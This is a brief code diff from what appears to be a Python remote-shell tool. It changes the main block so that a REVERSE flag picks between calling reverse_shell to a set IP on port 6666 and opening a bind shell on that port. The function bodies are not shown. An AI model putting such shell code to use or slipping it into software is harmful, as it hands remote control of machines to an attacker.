@@ -100,9 +100,10 @@ def bind_shell(PORT):
     easy_cmd(x)
 
 if __name__ == '__main__':
-    
-    #reverse_shell(IP, 6666)
-    bind_shell(6666)
+    if REVERSE == True:
+        reverse_shell(IP, 6666)
+    else:
+        bind_shell(6666)
     
 '''
     if len(sys.argv) > 3:
